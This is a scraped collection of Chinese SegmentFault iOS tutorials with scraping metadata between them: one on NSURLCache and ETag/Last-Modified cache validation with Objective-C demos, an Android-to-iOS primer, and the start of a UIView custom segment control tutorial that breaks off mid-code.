<blockquote><p>无数开发者尝试自己做一个简陋而脆弱的系统来实现网络缓存的功能，殊不知 <code>NSURLCache</code> 只要两行代码就能搞定且好上 100 倍。</p></blockquote>
<p>（AFN 是不是在暗讽 SDWebImage 复杂又蹩脚的缓存机制？？）</p>
<p>要注意</p>
<ul>
<li><p>iOS 5.0开始，支持磁盘缓存，但仅支持 HTTP</p></li>
<li><p>iOS 6.0开始，支持 HTTPS 缓存</p></li>
</ul>
<h3>控制缓存的有效性</h3>
<p>我们知道：只要是缓存，总会过期。</p>
<p>那么缓存的过期时间如何控制？</p>
<p>上文中的两行代码，已经给出了一个方法，指定超时时间。但这并也许不能满足我们的需求，如果我们对数据的一致性，时效性要求很高，即使1秒钟后数据更改了，客户端也必须展示更改后的数据。这种情况如何处理？</p>
<p>下面我们将对这种需求，进行解决方案的介绍。顺序是这样的：先从文件类型的缓存入手，引入两个概念。然后再谈下，一般数据类型比如 JSON 返回值的缓存处理。</p>
<h3>文件缓存：借助ETag或Last-Modified判断文件缓存是否有效</h3>
<h4>Last-Modified</h4>
<p>服务器的文件存贮，大多采用资源变动后就重新生成一个链接的做法。而且如果你的文件存储采用的是第三方的服务，比如七牛、青云等服务，则一定是如此。</p>
<p>这种做法虽然是推荐做法，但同时也不排除不同文件使用同一个链接。那么如果服务端的file更改了，本地已经有了缓存。如何更新缓存？</p>
<p>这种情况下需要借助 <code>ETag</code> 或 <code>Last-Modified</code> 判断图片缓存是否有效。</p>
<p><code>Last-Modified</code> 顾名思义，是资源最后修改的时间戳，往往与缓存时间进行对比来判断缓存是否过期。</p>
<p>在浏览器第一次请求某一个URL时，服务器端的返回状态会是200，内容是你请求的资源，同时有一个Last-Modified的属性标记此文件在服务期端最后被修改的时间，格式类似这样：</p>
<pre><code class=""Objective-C"">Last-Modified: Fri, 12 May 2006 18:53:33 GMT</code></pre>
<p>客户端第二次请求此URL时，根据 HTTP 协议的规定，浏览器会向服务器传送 If-Modified-Since 报头，询问该时间之后文件是否有被修改过：</p>
<pre><code class=""Objective-C"">If-Modified-Since: Fri, 12 May 2006 18:53:33 GMT</code></pre>
<p>总结下来它的结构如下：</p>
<table>
<thead><tr>
<th>请求 HeaderValue</th>
<th>响应 HeaderValue</th>
</tr></thead>
<tbody><tr>
<td>Last-Modified</td>
<td>If-Modified-Since</td>
</tr></tbody>
</table>
<p>如果服务器端的资源没有变化，则自动返回 HTTP 304 （Not Changed.）状态码，内容为空，这样就节省了传输数据量。当服务器端代码发生改变或者重启服务器时，则重新发出资源，返回和第一次请求时类似。从而保证不向客户端重复发出资源，也保证当服务器有变化时，客户端能够得到最新的资源。</p>
<p>判断方法用伪代码表示：</p>
<pre><code class=""Objective-C"">if ETagFromServer != ETagOnClient || LastModifiedFromServer != LastModifiedOnClient
   GetFromServer
else
   GetFromCache</code></pre>
<p>之所以使用</p>
<pre><code class=""Objective-C"">LastModifiedFromServer != LastModifiedOnClient</code></pre>
<p>而非使用：</p>
<pre><code class=""Objective-C"">LastModifiedFromServer &gt; LastModifiedOnClient</code></pre>
<p>原因是考虑到可能出现类似下面的情况：服务端可能对资源文件，废除其新版，回滚启用旧版本，此时的情况是：</p>
<pre><code class=""Objective-C"">LastModifiedFromServer &lt;= LastModifiedOnClient</code></pre>
<p>但我们依然要更新本地缓存。</p>
<p>参考链接：<a href=""http://stackoverflow.com/a/824209/3395008"" rel=""nofollow noreferrer""> <strong><em>What takes precedence: the ETag or Last-Modified HTTP header?</em></strong> </a> </p>
<p>Demo10和 Demo11 给出了一个完整的校验步骤：</p>
<p>并给出了 <code>NSURLConnection</code> 和 <code>NSURLSession</code> 两个版本：</p>
<pre><code class=""Objective-C"">/*!
 @brief 如果本地缓存资源为最新，则使用使用本地缓存。如果服务器已经更新或本地无缓存则从服务器请求资源。
 
 @details
 
 步骤：
 1. 请求是可变的，缓存策略要每次都从服务器加载
 2. 每次得到响应后，需要记录住 LastModified
 3. 下次发送请求的同时，将LastModified一起发送给服务器（由服务器比较内容是否发生变化）
 
 @return 图片资源
 */
- (void)getData:(GetDataCompletion)completion {
    NSURL *url = [NSURL URLWithString:kLastModifiedImageURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:15.0];
    
    //    // 发送 etag
    //    if (self.etag.length &gt; 0) {
    //        [request setValue:self.etag forHTTPHeaderField:@""If-None-Match""];
    //    }
    // 发送 LastModified
    if (self.localLastModified.length &gt; 0) {
        [request setValue:self.localLastModified forHTTPHeaderField:@""If-Modified-Since""];
    }
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        
        // NSLog(@""%@ %tu"", response, data.length);
        // 类型转换（如果将父类设置给子类，需要强制转换）
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        NSLog(@""statusCode == %@"", @(httpResponse.statusCode));
        // 判断响应的状态码是否是 304 Not Modified （更多状态码含义解释： https://github.com/ChenYilong/iOSDevelopmentTips）
        if (httpResponse.statusCode == 304) {
            NSLog(@""加载本地缓存图片"");
            // 如果是，使用本地缓存
            // 根据请求获取到`被缓存的响应`！
            NSCachedURLResponse *cacheResponse =  [[NSURLCache sharedURLCache] cachedResponseForRequest:request];
            // 拿到缓存的数据
            data = cacheResponse.data;
        }
        
        // 获取并且纪录 etag，区分大小写
        //        self.etag = httpResponse.allHeaderFields[@""Etag""];
        // 获取并且纪录 LastModified
        self.localLastModified = httpResponse.allHeaderFields[@""Last-Modified""];
        //        NSLog(@""%@"", self.etag);
        NSLog(@""%@"", self.localLastModified);
        dispatch_async(dispatch_get_main_queue(), ^{
            !completion ?: completion(data);
        });
    }] resume];
}</code></pre>
<h4>ETag</h4>
<p><code>ETag</code>  是什么？</p>
<p>HTTP 协议规格说明定义ETag为“被请求变量的实体值” （参见 —— 章节 14.19）。 另一种说法是，ETag是一个可以与Web资源关联的记号（token）。它是一个 hash 值，用作 Request 缓存请求头，每一个资源文件都对应一个唯一的  <code>ETag</code>  值，服务器单独负责判断记号是什么及其含义，并在HTTP响应头中将其传送到客户端，以下是服务器端返回的格式：</p>
<pre><code>ETag: ""50b1c1d4f775c61:df3""
</code></pre>
<p>客户端的查询更新格式是这样的：</p>
<pre><code>If-None-Match: W/""50b1c1d4f775c61:df3""
</code></pre>
<p>其中：<code>If-None-Match</code> - 与响应头的 Etag 相对应，可以判断本地缓存数据是否发生变化</p>
<p>如果ETag没改变，则返回状态304然后不返回，这也和Last-Modified一样。</p>
<p>总结下来它的结构如下：</p>
<table>
<thead><tr>
<th>请求 HeaderValue</th>
<th>响应 HeaderValue</th>
</tr></thead>
<tbody><tr>
<td>ETag</td>
<td>If-None-Match</td>
</tr></tbody>
</table>
<p><code>ETag</code> 是的功能与 <code> Last-Modified</code> 类似：服务端不会每次都会返回文件资源。客户端每次向服务端发送上次服务器返回的 <code>ETag </code> 值，服务器会根据客户端与服务端的  <code>ETag </code> 值是否相等，来决定是否返回 data，同时总是返回对应的 <code>HTTP</code> 状态码。客户端通过 <code>HTTP</code> 状态码来决定是否使用缓存。比如：服务端与客户端的 <code>ETag</code> 值相等，则 <code>HTTP</code> 状态码为 304，不返回 data。服务端文件一旦修改，服务端与客户端的 <code>ETag</code> 值不等，并且状态值会变为200，同时返回 data。</p>
<p>因为修改资源文件后该值会立即变更。这也决定了 <code>ETag</code>  在断点下载时非常有用。<br>比如 AFNetworking  在进行断点下载时，就是借助它来检验数据的。详见在  <code>AFHTTPRequestOperation</code>  类中的用法：</p>
<pre><code class=""Objective-C"">    //下载暂停时提供断点续传功能，修改请求的HTTP头，记录当前下载的文件位置，下次可以从这个位置开始下载。
- (void)pause {
    unsigned long long offset = 0;
    if ([self.outputStream propertyForKey:NSStreamFileCurrentOffsetKey]) {
        offset = [[self.outputStream propertyForKey:NSStreamFileCurrentOffsetKey] unsignedLongLongValue];
    } else {
        offset = [[self.outputStream propertyForKey:NSStreamDataWrittenToMemoryStreamKey] length];
    }

    NSMutableURLRequest *mutableURLRequest = [self.request mutableCopy];
    if ([self.response respondsToSelector:@selector(allHeaderFields)] &amp;&amp; [[self.response allHeaderFields] valueForKey:@""ETag""]) {
    //若请求返回的头部有ETag，则续传时要带上这个ETag，
    //ETag用于放置文件的唯一标识，比如文件MD5值
    //续传时带上ETag服务端可以校验相对上次请求，文件有没有变化，
    //若有变化则返回200，回应新文件的全数据，若无变化则返回206续传。
        [mutableURLRequest setValue:[[self.response allHeaderFields] valueForKey:@""ETag""] forHTTPHeaderField:@""If-Range""];
    }
    //给当前request加Range头部，下次请求带上头部，可以从offset位置继续下载
    [mutableURLRequest setValue:[NSString stringWithFormat:@""bytes=%llu-"", offset] forHTTPHeaderField:@""Range""];
    self.request = mutableURLRequest;

    [super pause];
}</code></pre>
<p>七牛等第三方文件存储商现在都已经支持<code>ETag</code>，Demo8和9 中给出的演示图片就是使用的七牛的服务，见：</p>
<pre><code class=""Objective-C"">static NSString *const kETagImageURL = @""http://ac-g3rossf7.clouddn.com/xc8hxXBbXexA8LpZEHbPQVB.jpg"";</code></pre>
<p>下面使用一个 Demo 来进行演示用法，</p>
<p>以 <code>NSURLConnection</code> 搭配  <code>ETag</code> 为例，步骤如下：</p>
<ul>
<li><p>请求的缓存策略使用 <code>NSURLRequestReloadIgnoringCacheData</code>，忽略本地缓存</p></li>
<li><p>服务器响应结束后，要记录 <code>Etag</code>，服务器内容和本地缓存对比是否变化的重要依据</p></li>
<li><p>在发送请求时，设置 <code>If-None-Match</code>，并且传入 <code>Etag</code></p></li>
<li><p>连接结束后，要判断响应头的状态码，如果是 <code>304</code>，说明本地缓存内容没有发生变化</p></li>
</ul>
<p>以下代码详见 Demo08 ：</p>
<pre><code class=""Objective-C"">/*!
 @brief 如果本地缓存资源为最新，则使用使用本地缓存。如果服务器已经更新或本地无缓存则从服务器请求资源。
 
 @details
 
 步骤：
 1. 请求是可变的，缓存策略要每次都从服务器加载
 2. 每次得到响应后，需要记录住 etag
 3. 下次发送请求的同时，将etag一起发送给服务器（由服务器比较内容是否发生变化）
 
 @return 图片资源
 */
- (void)getData:(GetDataCompletion)completion {
    NSURL *url = [NSURL URLWithString:kETagImageURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:15.0];
    
    // 发送 etag
    if (self.etag.length &gt; 0) {
        [request setValue:self.etag forHTTPHeaderField:@""If-None-Match""];
    }
    
    [NSURLConnection sendAsynchronousRequest:request queue:[NSOperationQueue mainQueue] completionHandler:^(NSURLResponse *response, NSData *data, NSError *connectionError) {
        
        // NSLog(@""%@ %tu"", response, data.length);dd
        // 类型转换（如果将父类设置给子类，需要强制转换）
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        NSLog(@""statusCode == %@"", @(httpResponse.statusCode));
        // 判断响应的状态码是否是 304 Not Modified （更多状态码含义解释： https://github.com/ChenYilong/iOSDevelopmentTips）
        if (httpResponse.statusCode == 304) {
            NSLog(@""加载本地缓存图片"");
            // 如果是，使用本地缓存
            // 根据请求获取到`被缓存的响应`！
            NSCachedURLResponse *cacheResponse =  [[NSURLCache sharedURLCache] cachedResponseForRequest:request];
            // 拿到缓存的数据
            data = cacheResponse.data;
        }
        
        // 获取并且纪录 etag，区分大小写
        self.etag = httpResponse.allHeaderFields[@""Etag""];
        
        NSLog(@""etag值%@"", self.etag);
        !completion ?: completion(data);
    }];
}</code></pre>
<p>相应的  <code>NSURLSession</code>  搭配 ETag 的版本见 Demo09：</p>
<pre><code class=""Objective-C"">/*!
 @brief 如果本地缓存资源为最新，则使用使用本地缓存。如果服务器已经更新或本地无缓存则从服务器请求资源。
 
 @details
 
 步骤：
 1. 请求是可变的，缓存策略要每次都从服务器加载
 2. 每次得到响应后，需要记录住 etag
 3. 下次发送请求的同时，将etag一起发送给服务器（由服务器比较内容是否发生变化）
 
 @return 图片资源
 */
- (void)getData:(GetDataCompletion)completion {
    NSURL *url = [NSURL URLWithString:kETagImageURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:15.0];
    
    // 发送 etag
    if (self.etag.length &gt; 0) {
        [request setValue:self.etag forHTTPHeaderField:@""If-None-Match""];
    }
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        
        // NSLog(@""%@ %tu"", response, data.length);
        // 类型转换（如果将父类设置给子类，需要强制转换）
        NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
        NSLog(@""statusCode == %@"", @(httpResponse.statusCode));
        // 判断响应的状态码是否是 304 Not Modified （更多状态码含义解释： https://github.com/ChenYilong/iOSDevelopmentTips）
        if (httpResponse.statusCode == 304) {
            NSLog(@""加载本地缓存图片"");
            // 如果是，使用本地缓存
            // 根据请求获取到`被缓存的响应`！
            NSCachedURLResponse *cacheResponse =  [[NSURLCache sharedURLCache] cachedResponseForRequest:request];
            // 拿到缓存的数据
            data = cacheResponse.data;
        }
        
        // 获取并且纪录 etag，区分大小写
        self.etag = httpResponse.allHeaderFields[@""Etag""];
        
        NSLog(@""%@"", self.etag);
        dispatch_async(dispatch_get_main_queue(), ^{
            !completion ?: completion(data);
        });
    }] resume];
}</code></pre>
<p>运行效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004847012"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""enter image description here"" title=""enter image description here""></span></p>
<h3>总结</h3>
<p>在官方给出的文档中提出 <code>ETag</code>  是首选的方式，优于 <code>Last-Modified</code> 方式。因为 <code>ETag</code> 是基于 hash ，hash 的规则可以自己设置，而且是基于一致性，是“强校验”。 <code>Last-Modified</code> 是基于时间，是弱校验，弱在哪里？比如说：如果服务端的资源回滚客户端的 <code>Last-Modified</code> 反而会比服务端还要新。</p>
<p>虽然 <code>ETag</code>  优于 <code>Last-Modified</code> ，但并非所有服务端都会支持，而 <code>Last-Modified</code> 则一般都会有该字段。 大多数情况下需要与服务端进行协调支持 <code>ETag</code>  ，如果协商无果就只能退而求其次。</p>
<p>Demo 也给出了一个不支持 <code>ETag</code> 的链接，基本随便找一张图片都行：</p>
<pre><code class=""Objective-C"">static NSString *const kLastModifiedImageURL = @""http://image17-c.poco.cn/mypoco/myphoto/20151211/16/17338872420151211164742047.png"";</code></pre>
<p>作为通用型的网络请求工具 AFNetworking 对该现状的处理方式是，判断服务端是否包含 <code>ETag</code> ，然后再进行相应处理。可见  <code>AFHTTPRequestOperation</code>  类中的用法，也就是上文中已经给出的断点下载的代码。</p>
<p>在回顾下思路：</p>
<ul><li><p>为资源分派 hash 值，然后对比服务端与本地缓存是否一致来决定是否需要更新缓存。</p></li></ul>
<p>这种思路，在开发中经常使用，比如：处于安全考虑，登陆操作一般不会传输账号密码，而是传输对应的 hash 值-- token ，这里的 token 就可以看做一个 file 资源，如果想让一个用户登陆超时时间是三天，只需要在服务端每隔三天更改下 token 值，客户端与服务端值不一致，然后服务端返回 token 过期的提示。</p>
<p>值得注意的一点是：如果借助了 <code>Last-Modified</code>  和  <code>ETag</code>，那么缓存策略则必须使用  <code>NSURLRequestReloadIgnoringCacheData</code> 策略，忽略缓存，每次都要向服务端进行校验。</p>
<p>如果 GET 中包含有版本号信息</p>
<p>众多的应用都会在 GET 请求后加上版本号：</p>
<pre><code class=""Objective-C"">http://abc.com?my_current_version=v1.0.0</code></pre>
<p>这种情况下，<code>?v1.0</code>  和 <code>?v2.0</code> 两个不同版本，请求到的 <code>Last-Modified</code>  和  <code>ETag</code> 会如预期吗？</p>
<p>这完全取决于公司服务端同事的实现， <code>Last-Modified</code>  和   <code>ETag</code> 仅仅是一个协议，并没有统一的实现方法，而服务端的处理逻辑完全取决于需求。</p>
<p>你完全可以要求服务端同事，仅仅判断资源的异同，而忽略掉 <code>?v1.0</code>  和 <code>?v2.0</code> 两个版本的区别。</p>
<p>参考链接：<a href=""http://stackoverflow.com/a/1005505"" rel=""nofollow noreferrer""><strong><em>if-modified-since vs if-none-match</em></strong></a></p>
<h2>一般数据类型借助 <code> Last-Modified </code> 与  <code>ETag</code> 进行缓存</h2>
<p>以上的讨论是基于文件资源，那么对一般的网络请求是否也能应用？</p>
<p>控制缓存过期时间，无非两种：设置一个过期时间；校验缓存与服务端一致性，只在不一致时才更新。</p>
<p>一般情况下是不会对 api 层面做这种校验，只在有业务需求时才会考虑做，比如：</p>
<ol>
<li><p>数据更新频率较低，“万不得已不会更新”---只在服务器有更新时才更新，以此来保证2G 等恶略网络环境下，有较好的体验。比如网易新闻栏目，但相反微博列表、新闻列表就不适合。</p></li>
<li><p>业务数据一致性要求高，数据更新后需要服务端立刻展示给用户。客户端显示的数据必须是服务端最新的数据</p></li>
<li><p>有离线展示需求，必须实现缓存策略，保证弱网情况下的数据展示的速度。但不考虑使用缓存过期时间来控制缓存的有效性。</p></li>
<li><p>尽量减少数据传输，节省用户流量</p></li>
</ol>
<p>一些建议：</p>
<ol>
<li><p>如果是 file 文件类型，用 <code>Last-Modified</code> 就够了。即使 <code>ETag</code> 是首选，但此时两者效果一致。九成以上的需求，效果都一致。</p></li>
<li><p>如果是一般的数据类型--基于查询的 get 请求，比如返回值是 data 或 string 类型的 json 返回值。那么 <code>Last-Modified</code> 服务端支持起来就会困难一点。因为比如<br>你做了一个博客浏览 app ，查询最近的10条博客， 基于此时的业务考虑 <code>Last-Modified</code> 指的是10条中任意一个博客的更改。那么服务端需要在你发出请求后，遍历下10条数据，得到“10条中是否至少一个被修改了”。而且要保证每一条博客表数据都有一个类似于记录 <code>Last-Modified</code> 的字段，这显然不太现实。</p></li>
</ol>
<p>如果更新频率较高，比如最近微博列表、最近新闻列表，这些请求就不适合，更多的处理方式是添加一个接口，客户端将本地缓存的最后一条数据的的时间戳或 id 传给服务端，然后服务端会将新增的数据条数返回，没有新增则返回 nil 或 304。</p>
<p>参考链接： <a href=""http://www.jianshu.com/p/8a4dc775c051"" rel=""nofollow noreferrer"">《(慕课网)imooc iPhone3.3 接口数据缓存》</a></p>
<h3>剩下20%的网络缓存需求</h3>
<h4>真的有<code>NSURLCache</code> 不能满足的需求？</h4>
<p>有人可能要问：</p>
<blockquote><p><code>NSURLCache</code> 不是帮我们做了硬盘缓存么？那我们为什么要自己用数据库做本地缓存啊。为啥不直接用<code>NSURLCache</code> 不是更方便？</p></blockquote>
<p>系统帮我们做的缓存，好处是自动，无需我们进行复杂的设置。坏处也恰恰是这个：不够灵活，不能自定义。只能指定一个缓存的总文件夹，不能分别指定每一个文件缓存的位置，更不能为每个文件创建一个文件夹，也不能指定文件夹的名称。缓存的对象也是固定的：只能是 GET请求的返回值。</p>
<p>下一篇文章我们将主要围绕这一问题展开讨论下：<a href=""https://github.com/ChenYilong/ParseSourceCodeStudy"" rel=""nofollow noreferrer"">使用80%的代码来完成剩下的20%的缓存需求</a> 。敬请 star （右上角）持续关注</p>

                ", iOS网络缓存扫盲篇 - 使用两行代码就能完成80%的缓存需求,1531972065,401,1,512,1,1,https://segmentfault.com/a/1190000004356632
123,1,0,6,"
                    
<p>最近因为公司的一些原因，需要涉及iOS开发。在坑里摸爬滚打了2周之后，就写个入门心得吧。<br>在一切的一切开始之前，你要先会<code>Objective-C</code>或者<code>Swift</code>（喜欢哪个用哪个，你开心就好）。</p>
<p>然后，要准备一台<code>OS X</code>的电脑，并安装好<code>Xcode</code>，然后一切就可以开始了。</p>
<p>打开<code>Xcode</code>，然后新建一个项目，看到的界面是这样的（其实和<code>Android Studio</code>的模式很相似啦）</p>
<p><span class=""img-wrap""><img data-src=""/img/bVr4z0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span><br>看看几个项目，你大概也理解了分别要创建怎么样的应用，它提供一个模板，然后可以快速创建出某种结构的程序。大部分情况的应用是属于<code>Tabbed Application</code>，也就是带<code>Tab</code>的程序。</p>
<h2>文件概念迁移</h2>
<p>创建好一个应用后，我们能看到<code>AppDelegate</code>，<code>storyboard</code>，<code>plist</code>之类的文件。这些分别是啥呢？</p>
<p><em>我来个简单干脆的映射，方便理解，但是不精准，如有错误，感谢指出</em></p>
<table>
<thead><tr>
<th>iOS</th>
<th>Android</th>
<th>备注</th>
</tr></thead>
<tbody>
<tr>
<td><code>Info.plist</code></td>
<td><code>AndroidManifest.xml</code></td>
<td>记录应用程序的一些元数据</td>
</tr>
<tr>
<td><code>AppDelegate</code></td>
<td><code>Application</code></td>
<td>管理整个<code>Application</code>的生命周期</td>
</tr>
<tr>
<td><code>ViewController</code></td>
<td><code>Activity</code></td>
<td>负责管理<code>View</code>，管理整个应用程序的交互</td>
</tr>
<tr>
<td>各类<code>storyboard</code>文件</td>
<td>各类<code>xml</code>文件</td>
<td>定义一些布局，一些iOS程序员习惯在代码里写布局，可能用不到<code>storyboard</code>
</td>
</tr>
</tbody>
</table>
<p><code>Android</code>程序始于<code>Application</code>的<code>onCreate</code>方法，<code>iOS</code>始于<code>AppDelegate</code>的<code>application didFinishLaunchingWithOptions</code>方法，这里唯一不同的是<code>Android</code>的<code>launch activity</code>只能使用<code>AndroidManifest.xml</code>指定，但是<code>iOS</code>可以使用代码去指定。</p>
<pre><code>self.window.rootViewController = xxxx;</code></pre>
<h2>从Activity到UIViewController</h2>
<p><code>Android</code>中的<code>Activity</code>和<code>View</code>并没有强制关联，但是<code>iOS</code>中的<code>UIViewController</code>默认都带一个<code>View</code>，你可以把这个认为是<code>Activity</code>中<code>Window</code>的<code>decorView</code>，是所有<code>View</code>的父容器。当你生成好一个<code>UIViewController</code>之后，你往它的成员变量<code>view</code>中添加你的视图即可，如果你是从<code>storyboard</code>中生成的<code>UIViewController</code>，那你构建的<code>View</code>就会自动添加进来。</p>
<p><code>Android</code>一切初始化的地方，我们习惯在<code>onCreate</code>中使用<code>setContentView</code>之后，然后用<code>findViewById</code>获取到控件的实例，为控件绑定一些监听器，而<code>iOS</code>中，我们开始的地方，大部分是<code>UIViewController</code>的<code>viewDidLoad</code>方法，我们使用代码生成我们要的控件，同时为控件绑定事件，或者使用<code>storyboard</code>的<code>Outlet</code>系统绑定到我们的类成员变量上，并生成事件监听。</p>
<p>所有故事，都是从这里开始对吧？</p>
<p>接下去要做的事就是根据用户和控件的交互，在视图上做出相应的反馈即可。</p>
<h2>界面之间的跳转</h2>
<p><code>Android</code>的跳转使用<code>Intent</code>从一个<code>Activity</code>跳转到另外一个<code>Activity</code>。<br>而<code>iOS</code>中，我们在跳转之前，要做的事情就是生成我们的目标<code>UIViewController</code>，然后使用我们想要的方式跳转。 <code>iOS</code>为我们提供了几种模式跳转，最常见的有2种，使用<code>navigationController</code>和<code>pushModal</code>，大部分的<code>iOS</code>程序，顶部都有一个导航条，它由一个更高级抽象的<code>NavigationController</code>进行控制，就和<code>Android</code>中的<code>Task</code>概念类似，我们每次<code>pushViewController</code>，就会在它的栈中压入一个<code>ViewController</code>。而<code>pushModal</code>看名字就知道，是弹出一个模态框，它的返回操作一般只有关闭一个按钮，具体使用哪种方式，需要和产品的概念相呼应才行。</p>
<p>UI的相关介绍就到这，接下去有时间，我们谈谈<code>Android</code>中的<code>Handler</code>在<code>iOS</code>中以什么样的方式存在</p>

                ", Android 程序员学习 iOS  ——故事从这里开始,1531972066,561,1,211,1,1,https://segmentfault.com/a/1190000004268513
124,1,0,6,"
                    
<h2>简介</h2>
<p>本文将是一个关于Cocoa Touch中UIKit框架的自定义控件系列教程，我们将从基础开始，由浅入深，分析讲解自定义控件的相关知识和技巧。</p>
<h2>基础概念，给新人看</h2>
<h3>基础知识</h3>
<ol>
<li><p><code>UIKit</code>是<code>iOS</code>系统使用的界面框架</p></li>
<li><p><code>UIKit</code>中最基本的类是<code>UIView</code>，也就是界面的基础操作类</p></li>
<li><p>iOS使用的渲染框架叫<code>Core Graphics</code>，所以才回有<code>CG</code>开头的一堆基础类型，如CGFloat(浮点),CGPoint(点),CGSize(尺寸),CGRect(矩形)</p></li>
<li><p><code>UIView</code>对象都包含至少一个<code>CALayer</code>对象，<code>CALayer</code>才是最终渲染出效果的对象</p></li>
<li><p><code>UIView</code>和<code>CALayer</code>的层级关系是相同的，他们都是多叉树，同一个<code>父View(superView)</code>的<code>子View们（subViews）</code>是有层级覆盖关系的，上层的View遮挡下层View</p></li>
<li><p>这里所说的<code>层</code>关系和设计软件中的层关系是类似的，如Photoshop，Sketch等</p></li>
<li><p><code>UIView</code>和<code>CALayer</code>的分工是，前者负责<strong>保存属性</strong>和<strong>处理响应链</strong>，后者负责渲染</p></li>
</ol>
<h2>一、 UIView的基本属性和方法</h2>
<p>今天我们一起做一个多段选择的自定义控件，顺便学习UIView的基本属性和方法。先来看一下实现的效果：<a href=""https://github.com/zsy78191/XXXSegmentView"" rel=""nofollow noreferrer"">Github下载源码</a></p>
<p><span class=""img-wrap""><img data-src=""/img/bVrUXW"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p><strong>先讲一下思路</strong> 我们继承UIView写一个XXXSegmentView，用<code>UILabel</code>作为XXXSegmentView的子View，显示上图中的标签。</p>
<p>我们的多段选择View，暂且命名为XXXSegmentView，继承自<code>UIView</code>。首先创建一个新文件，选择xcode菜单，File －&gt; New -&gt; File </p>
<p><span class=""img-wrap""><img data-src=""/img/bVrUYg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br><span class=""img-wrap""><img data-src=""/img/bVrUYh"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>得到文件<code>XXXSegmentView.h</code>和<code>XXXSegmentView.m</code>，我们给<code>XXXSegmentView</code>写一个初始化配置的方法，<code>- (void)configForTitles:(NSArray&lt;NSString*&gt;*)titles;</code>。</p>
<pre><code>@interface XXXSegmentView : UIView
 
- (void)configForTitles:(NSArray&lt;NSString*&gt;*)titles;
@property (nonatomic, assign) NSInteger number; //记录titles的个数
@end</code></pre>
<p>这里注明了要使用者传入一个包含字符串类型的数组。这样我们的自定义控件之要两步就能初始化完毕，如下在ViewController中加入初始化代码:</p>
<pre><code>- (void)configSegment
{
    XXXSegmentView* segment = [[XXXSegmentView alloc] initWithFrame:CGRect(0,0,300,80)];
    
    //加入三个标题，内容入数组中传入
    [segment configForTitles:@[@""Main"",@""More"",@""Me""]];
    
    [self.view addSubview:segment];
}</code></pre>
<p><strong>解释:CGRect(0,0,300,80)返回一个CGRect数据，是一个矩形，前两个值是起始点，也就是左上角的坐标，后两个数是尺寸，300是宽，80是高</strong></p>
<p>接下来我们需要实现<code>configForTitles</code>这个方法了。来到<code>XXXSegmentView</code>中，我们加入代码:</p>
<pre><code>- (void)cleanAll
{
    [self.subviews enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        if ([obj isKindOfClass:[UILabel class]]) {
             [obj removeFromSuperview];
        }
    }];
}</code></pre>
<p><strong>解释:cleanAll这个方法，通过self.subviews方法，返回的是包含了segmentView的全部子view的数组，然后用enumerateObjectsUsingBlock方法进行快速枚举，筛选出其中是UILabel的View，调用它的removeFromSuperview方法将其移除</strong></p>
<p>这个函数存在的意义，就是在使用者多次调用<code>configForTitles</code>更改标签的时候，清除掉旧的Label。</p>
<pre><code>- (UILabel*)standLabel
{
    UILabel * label = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 100, 50)];
    label.font = [UIFont systemFontOfSize:14];
    label.textColor = self.tintColor;
    return label;
}</code></pre>
<p><strong>解释：UILabel类是UIView的子类，用于显示文字，支持多行显示，支持改变字体和颜色</strong><br><strong>[UIFont systemFontOfSize:14]方法返回一个系统字体对象UIFont</strong><br><strong>label.textColor = self.tintColor;这一步将我们segment的tintColor传给了Label作为字体Color</strong></p>
<p>所谓的<code>TintColor</code>可以理解为控件的高亮颜色，是UIView的默认属性，所以继承于UIView的XXXSegmentView也有这个属性，并且有默认值。</p>
<pre><code>- (void)configForTitles:(NSArray *)titles
{
    [self cleanAll];
     self.number = titles.count;
    [titles enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {
        UILabel* la = [self standLabel];
        [la setText:obj];
        [la setBackgroundColor:[UIColor clearColor]];
        [self addSubview:la];
        la.tag = idx + 981;
    }];
}</code></pre>
<p><strong>解释</strong>我们首先记录了标题的个数，然后调用<code>cleanAll</code>方法，清楚旧的Label，然后根据传入的titles数组，给View加入新的Label，并且，我们给label加了文字，和透明色<code>([UIColor clearColor])</code>的背景。</p>
<p>最后我们给每一个Label加了一个<code>Tag</code>编号，这个编号从981（这个数是我随便选的，你也可以选个更大的）开始，用来标记我们的Label们前后顺序。</p>
<h3>布局入门</h3>
<p>代码写到这里，我们运行软件，并不能得到想要的并排展示效果，因为我们所有的label，位置没有做调整。</p>
<p>用什么属性控制UIView的位置呢？答案是<code>Frame</code>属性。 </p>
<p>我们把屏幕比作一个画板，左上角是(0,0)坐标，frame则是一个矩形，如CGRect(0,0,100,50)代表一个从(0,0)点开始，宽100，高50的矩形。当我们重新设置UIView的Frame属性，他们的位置就改变了。</p>
<p>所以我们给XXXSegmentView.m加入如下代码:</p>
<pre><code>- (CGRect)boundsWithLabel:(UILabel*)label
{
    return [label.text boundingRectWithSize:CGSizeMake(CGFLOAT_MAX, label.frame.size.height) options:NSStringDrawingUsesFontLeading attributes:@{NSFontAttributeName:label.font} context:nil];
}
</code></pre>
